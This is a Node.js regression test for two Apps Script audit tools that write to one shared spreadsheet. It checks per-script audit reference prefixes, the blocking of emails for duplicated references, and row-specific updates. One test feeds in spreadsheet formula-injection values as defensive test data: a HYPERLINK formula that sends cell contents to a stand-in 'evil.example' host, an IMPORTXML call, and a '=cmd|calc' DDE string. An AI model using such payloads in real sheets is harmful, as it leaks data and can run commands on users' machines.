/**
 * Regression test for "NH and TI hand out the same audit reference".
 *
 * The NH Analyzer and the TI Analyzer are two Apps Script projects running the
 * same code against ONE spreadsheet. The daily audit-ref counter lives in each
 * script's own Script Properties, so both restart at 1 every morning and both
 * hand out NHA-YYYYMMDD-0001, -0002, ... Two Audit_Log rows then share one
 * reference, and an email link (which opens the first row with that reference)
 * shows the other script's agent and observer.
 *
 * Fix under test:
 *   1. The reference prefix is chosen by the script's own ID (NH = NHA,
 *      TI = TIA), so the two scripts can never produce the same reference.
 *   2. References that are ALREADY duplicated in the sheet are handled safely:
 *      sendAuditEmail refuses them (the link would open the wrong agent), and
 *      updateDashboardPDFLink_ updates only the row that matches the audit.
 *
 * Loads the REAL Config.gs, SheetService.gs and selected Code.gs functions
 * into a sandbox with an in-memory fake spreadsheet.
 *
 * Usage: node tests/shared-sheet-audit-test.js
 * Exits non-zero if any check fails.
 */
const vm = require('vm');
const { read, extractFunction, FakeSheet, makeCheck } = require('./lib/gas-fakes');
const codeSrc = read('Code.gs');

const NH_SCRIPT_ID = '1P_dbehoDRZsqG22se2cYcaD1aKBxTuX3g4G2-moBzKLg7Sc5GLtPnAca';
const TI_SCRIPT_ID = '1KfR8crJ3ep5SqQsrUEFuksplZeacsMFIdW6yO56fxRLPxTppiOtr4Yww';

// One script's runtime. `sharedSheets` is the spreadsheet both scripts write to;
// `scriptId` and the property store are private to this script, as in Apps Script.
function makeScript(scriptId, sharedSheets, opts) {
  opts = opts || {};
  const logs = [];
  const props = {};
  const sandbox = {
    Logger: { log: m => logs.push(m) },
    CacheService: { getScriptCache: () => ({ get: () => null, put() {}, remove() {} }) },
    LockService: { getScriptLock: () => ({
      waitLock() { if (opts.lockFails) throw new Error('Lock timeout'); },
      releaseLock() {},
    }) },
    PropertiesService: { getScriptProperties: () => ({
      getProperty: k => (k in props ? props[k] : null),
      setProperty: (k, v) => { props[k] = String(v); },
    }) },
    Utilities: { base64Encode: s => Buffer.from(String(s)).toString('base64'), sleep() {} },
    ScriptApp: { getScriptId: () => scriptId, getService: () => ({ getUrl: () => 'https://example.com/exec' }) },
    sharedCSS: () => '', fixBadgeClasses: h => h, invalidateDashboardCache_: () => {},
  };
  sandbox.globalThis = sandbox;
  const ctx = vm.createContext(sandbox);
  vm.runInContext(read('Config.gs'), ctx);
  vm.runInContext(read('HtmlSanitizer.gs'), ctx);
  vm.runInContext(read('EmailGuard.gs'), ctx);
  vm.runInContext(read('SheetService.gs'), ctx);
  ['generateAuditRef_', '_uniqueFallbackAuditRef', '_generateTempRef', '_findAuditRowIndex', 'updateDashboardPDFLink_', 'sendAuditEmail']
    .forEach(n => vm.runInContext(extractFunction(codeSrc, n), ctx));

  if (!sharedSheets.audit) {
    sharedSheets.audit = new FakeSheet(ctx.AUDIT_LOG_HEADERS, []);
    sharedSheets.dash  = new FakeSheet(ctx.DASHBOARD_HEADERS, []);
  }
  const byName = {};
  byName[ctx.AUDIT_LOG_SHEET] = sharedSheets.audit;
  byName[ctx.DASHBOARD_DATA_SHEET] = sharedSheets.dash;
  const ss = { getSheetByName: n => byName[n] || null, insertSheet: n => (byName[n] = new FakeSheet([], [])), getUrl: () => 'https://sheet' };
  ctx.getOrCreateSpreadsheet = () => ss;
  return { ctx, logs, props };
}

const check = makeCheck();

console.log('NH Analyzer — shared-sheet audit reference test');

console.log('\nTest 1 — NH and TI never hand out the same reference on the same day');
{
  const shared = {};
  const nh = makeScript(NH_SCRIPT_ID, shared);
  const ti = makeScript(TI_SCRIPT_ID, shared);
  const nhRefs = [], tiRefs = [];
  for (let i = 0; i < 5; i++) { nhRefs.push(nh.ctx.generateAuditRef_()); tiRefs.push(ti.ctx.generateAuditRef_()); }
  const overlap = nhRefs.filter(r => tiRefs.indexOf(r) !== -1);
  check('no reference is issued by both scripts', overlap.length === 0, 'shared refs: ' + JSON.stringify(overlap));
  check('NH references start with NHA-', nhRefs.every(r => /^NHA-\d{8}-\d{4}$/.test(r)), JSON.stringify(nhRefs));
  check('TI references start with TIA-', tiRefs.every(r => /^TIA-\d{8}-\d{4}$/.test(r)), JSON.stringify(tiRefs));
  check('each script still counts 0001, 0002, ... on its own',
        /-0001$/.test(nhRefs[0]) && /-0005$/.test(nhRefs[4]) && /-0001$/.test(tiRefs[0]) && /-0005$/.test(tiRefs[4]));
}

console.log('\nTest 2 — an unknown script (a copy, a dev project) falls back to NHA');
{
  const other = makeScript('some-other-script-id', {});
  const ref = other.ctx.generateAuditRef_();
  check('unknown script ID uses NHA-', /^NHA-\d{8}-\d{4}$/.test(ref), 'got ' + ref);
  const broken = makeScript(null, {});
  broken.ctx.ScriptApp = { getScriptId: () => { throw new Error('unavailable'); } };
  check('a failing ScriptApp call still yields an NHA- reference', /^NHA-\d{8}-\d{4}$/.test(broken.ctx.generateAuditRef_()));
}

console.log('\nTest 3 — the fallback and temp references also carry the script prefix');
{
  const ti = makeScript(TI_SCRIPT_ID, {}, { lockFails: true });
  const fallback = ti.ctx.generateAuditRef_();
  check('lock-timeout fallback ref uses TIA-', /^TIA-\d{8}-\d{4}$/.test(fallback), 'got ' + fallback);
  const tmp = ti.ctx._generateTempRef();
  check('temp ref uses TIA-', /^TIA-\d{8}-TEMP$/.test(tmp), 'got ' + tmp);
  const nh = makeScript(NH_SCRIPT_ID, {});
  check('NH temp ref still uses NHA-', /^NHA-\d{8}-TEMP$/.test(nh.ctx._generateTempRef()));
}

// Two rows that ALREADY share one reference: one written by NH, one by TI.
const REF = 'NHA-20260929-0004';
const INT_NH = 'nh-interaction-1', INT_TI = 'ti-interaction-1';
const SAP_NH = '373106', SAP_TI = '2008995';
function duplicateRefEnv() {
  const shared = {};
  const s = makeScript(NH_SCRIPT_ID, shared);
  const ctx = s.ctx;
  [[INT_NH, SAP_NH, 'Fatima Paredes'], [INT_TI, SAP_TI, 'Rose Anne Ocana']].forEach(a => {
    shared.audit.appendRow(ctx.AUDIT_LOG_HEADERS.map(h => ({
      'Audit Ref': REF, 'Interaction ID': a[0], 'SAP ID': a[1], 'Team Member': a[2],
    }[h] || '')));
    shared.dash.appendRow(ctx.DASHBOARD_HEADERS.map(h => ({
      'Audit Ref': REF, 'Interaction ID': a[0], 'SAP ID': a[1], 'Team Member': a[2],
    }[h] || '')));
  });
  return { ctx, shared };
}

console.log('\nTest 4 — sendAuditEmail refuses a reference that two rows already share');
{
  function runSend(form, rows) {
    let sent = 0;
    const { ctx } = makeScript(NH_SCRIPT_ID, {});
    Object.assign(ctx, {
      readAuditLog_: () => rows.map(r => Object.assign({ 'Observer Name': 'QA One' }, r)),
      Session: { getActiveUser: () => ({ getEmail: () => 'analyst@telus.com' }) },
      resolveObserver_: () => ({ name: 'QA One', email: 'analyst@telus.com' }),
      ADMIN_USERNAMES: [], ADMIN_DOMAIN: 'telus.com',
      getRecipientsFromRoster_: () => [], buildAuditRecipients_: () => ['agent@telus.com'],
      buildAgentEmailHTML: () => '<html></html>',
      sendEmailInBatches_: () => { sent++; },
      extractTextBlock: () => 'Yes',
      updateDashboardPDFLink_: () => {}, notifyAdmins_: () => {}, updateCachedResult_: () => {},
      logSubmissionError_: () => {},
    });
    return { result: ctx.sendAuditEmail(form, '<html>report</html>'), sent: () => sent };
  }
  const rows = [
    { 'Audit Ref': REF, 'SAP ID': SAP_NH, 'Interaction ID': INT_NH },  // written first, by the other script
    { 'Audit Ref': REF, 'SAP ID': SAP_TI, 'Interaction ID': INT_TI },
  ];
  const form = (sap, intId) => ({ auditRef: REF, participant: 'X', sapId: sap, interactionId: intId,
                                  analysisType: 'repeats', startTime: '2026-09-29' });

  let r = runSend(form(SAP_TI, INT_TI), rows);
  check('the second row owner is refused and nothing is emailed', r.result.success === false && r.sent() === 0, JSON.stringify(r.result));
  r = runSend(form(SAP_NH, INT_NH), rows);
  check('the first row owner is refused too, because the link is ambiguous', r.result.success === false && r.sent() === 0, JSON.stringify(r.result));
  r = runSend(form(SAP_TI, INT_TI), rows.slice(1));
  check('once the twin is renamed (one row left) the same form sends', r.result.success === true && r.sent() === 1, JSON.stringify(r.result));
  r = runSend(form('999999', 'some-other-call'), rows);
  check('a form matching neither row is still blocked and nothing is emailed', r.result.success === false && r.sent() === 0, JSON.stringify(r.result));
  r = runSend(form(SAP_NH, INT_TI), rows);
  check('SAP ID from one row with the Interaction ID of the other is blocked', r.result.success === false && r.sent() === 0, JSON.stringify(r.result));
}

console.log('\nTest 5 — updateDashboardPDFLink_ updates only the row that matches the audit');
{
  const { ctx, shared } = duplicateRefEnv();
  ctx.updateDashboardPDFLink_(INT_TI, 'Sent', ['rose@telus.com'], REF, 'Yes');
  const dS = ctx.DASHBOARD_HEADERS.indexOf('Email Status'), lS = ctx.AUDIT_LOG_HEADERS.indexOf('Email Status');
  const lR = ctx.AUDIT_LOG_HEADERS.indexOf('Recipients');
  check('Dashboard_Data: the matching (second) row is marked Sent', shared.dash.grid[2][dS] === 'Sent', JSON.stringify(shared.dash.grid[2][dS]));
  check('Dashboard_Data: the other script\'s (first) row is untouched', !shared.dash.grid[1][dS], JSON.stringify(shared.dash.grid[1][dS]));
  check('Audit_Log: the matching (second) row is marked Sent', shared.audit.grid[2][lS] === 'Sent', JSON.stringify(shared.audit.grid[2][lS]));
  check('Audit_Log: the other script\'s (first) row is untouched', !shared.audit.grid[1][lS], JSON.stringify(shared.audit.grid[1][lS]));
  check('Audit_Log: recipients written to the matching row only', shared.audit.grid[2][lR] === 'rose@telus.com' && !shared.audit.grid[1][lR]);
}

console.log('\nTest 6 — nothing the browser sends can become a formula in the sheets');
{
  const { ctx, shared } = duplicateRefEnv();
  const dS = ctx.DASHBOARD_HEADERS.indexOf('Email Status'), dR = ctx.DASHBOARD_HEADERS.indexOf('Issue Resolved');
  const lS = ctx.AUDIT_LOG_HEADERS.indexOf('Email Status'), lR = ctx.AUDIT_LOG_HEADERS.indexOf('Recipients'), lI = ctx.AUDIT_LOG_HEADERS.indexOf('Issue Resolved');
  const HOSTILE = '=HYPERLINK("http://evil.example/?"&A1,"x")';
  ctx.updateDashboardPDFLink_(INT_TI, HOSTILE, ['=cmd|calc', '+1@telus.com'], REF, '=IMPORTXML("http://evil.example","//a")');
  const stored = [shared.dash.grid[2][dS], shared.audit.grid[2][lS], shared.audit.grid[2][lR]];
  check('the e-mail status and the recipients are stored as text (they would run as formulas otherwise)', stored.every(v => !/^[=+\-@]/.test(String(v))), JSON.stringify(stored));
  check('the text is kept (a leading apostrophe), not thrown away', String(stored[0]).indexOf('HYPERLINK') !== -1 && String(stored[2]).indexOf('cmd|calc') !== -1, JSON.stringify(stored));
  check('an Issue Resolved override that is not one of the three answers is not written at all', !shared.dash.grid[2][dR] && !shared.audit.grid[2][lI], JSON.stringify([shared.dash.grid[2][dR], shared.audit.grid[2][lI]]));
  ctx.updateDashboardPDFLink_(INT_TI, 'Sent', [], REF, 'partially');
  check('the three real answers still work (partially becomes Partially resolved)', shared.dash.grid[2][dR] === 'Partially resolved' && shared.audit.grid[2][lI] === 'Partially resolved', JSON.stringify([shared.dash.grid[2][dR], shared.audit.grid[2][lI]]));
  ctx.updateDashboardPDFLink_(INT_TI, 'x'.repeat(500), [], REF, '');
  check('a very long status is cut to 40 characters', String(shared.audit.grid[2][lS]).length === 40, String(String(shared.audit.grid[2][lS]).length));
}

console.log('\nTest 7 — after the e-mail status is written, the Audit Log cache is dropped too');
{
  const { ctx } = duplicateRefEnv();
  const dropped = { dash: 0, log: 0 };
  ctx.invalidateDashboardCache_ = () => { dropped.dash++; };
  ctx.invalidateAuditLogCache_ = () => { dropped.log++; };
  ctx.updateDashboardPDFLink_(INT_TI, 'Sent', ['rose@telus.com'], REF, '');
  check('the dashboard cache is dropped', dropped.dash === 1, JSON.stringify(dropped));
  check('and the Audit Log cache is dropped (it kept showing Not Sent for 20 minutes, and an export built from it could be sent twice)', dropped.log === 1, JSON.stringify(dropped));
}

console.log(check.state.failures === 0 ? '\nALL TESTS PASSED' : '\n' + check.state.failures + ' CHECK(S) FAILED');
process.exit(check.state.failures === 0 ? 0 : 1);
